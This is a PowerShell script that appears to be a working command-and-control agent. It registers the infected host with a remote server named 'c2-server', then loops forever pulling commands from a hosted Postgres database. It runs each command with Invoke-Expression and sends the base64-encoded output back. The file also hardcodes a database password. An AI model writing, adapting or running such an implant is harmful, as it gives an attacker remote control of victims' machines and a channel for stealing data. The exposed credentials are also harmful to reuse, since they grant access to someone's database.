$url = "c2-server-n1mb.onrender.com"
$current_user = hostname


function ExecuteQuery {
    param (
        [string]$query  # The SQL query to execute
    )

    # Define the connection details
    $connectionDetails = "host=dpg-ct7il0btq21c73bp8rsg-a.oregon-postgres.render.com port=5432 dbname=generic_postgres user=generic_postgres password=XbuK5rJEs0V6DPjWwmCeXiTeZy83Tg4A sslmode=require"

    # Construct the psql command
    $psqlCommand = "psql -t -A -F"","" ""$connectionDetails"" -c `"$query`""

    # Execute the command and capture the output
    $queryResult = Invoke-Expression $psqlCommand

    # Return the result
    return $queryResult
}


function Register-Command{
# Call the function and execute a query
$queryResult = ExecuteQuery -query "SELECT hostname FROM agents;"

# Split the results into an array
$hostnames = $queryResult -split "`n"


foreach($host_name in $hostnames){
    if($host_name -eq $current_user.ToLower()){
        $cmd = ExecuteQuery -query "SELECT command FROM agents WHERE hostname = '$host_name' LIMIT 1"
        break
    }
}

$result = Invoke-Expression $cmd

$bytes = [System.Text.Encoding]::UTF8.GetBytes($result)
$base64Data = [Convert]::ToBase64String($bytes)

$currentDate = Get-Date
$currentTime = $currentDate.ToString('yyyy-MM-dd HH:mm:ss')

foreach($host_name in $hostnames){
    if($host_name -eq $current_user){
        $query = ExecuteQuery -query "UPDATE agents SET result='$base64Data',last_callback = '$currentTime'  WHERE hostname = '$host_name'"
        break
    }
}

}

function Update-Agent{
$dataTable = ExecuteQuery -query "SELECT * FROM agents"
$hostnames = $dataTable.hostname
foreach($host_name in $hostnames){
    if($host_name -eq $current_user.ToLower()){
        $query = ExecuteQuery -query "DELETE FROM agents WHERE hostname = '$host_name'"
    }
}
}

function Register-Agent {
    param (
        [string]$hostname,
        [int]$proc_id,
        [string]$process_name,
        [string]$architecture
    )

    $data = @{
        hostname = $hostname
        pid = $pid
        process_name = $process_name
        architecture = $architecture
    }

    $jsonData = $data | ConvertTo-Json

    try {
        $response = Invoke-WebRequest -Uri "$url/register_agent" -Method Post -Body $jsonData -ContentType "application/json"
    
        # Display the status code and response content
        Write-Output "Status Code: $($response.StatusCode)"
        Write-Output "Response Content: $($response.Content)"
    } catch {
        Write-Warning "Error: $($_.Exception.Message)"
    
    }   
}

# Function that deletes agent if that agent already exists in the database
Update-Agent


# Register Agent
$hostname = hostname
$proc_id = $PID
$process_name = (Get-Process -Id $PID).ProcessName
$architecture = if ([Environment]::Is64BitProcess) { "x64" } else { "x86" }
Register-Agent -hostname $hostname -proc_id $proc_id -process_name $process_name -architecture $architecture


while ($true){
Register-Command
}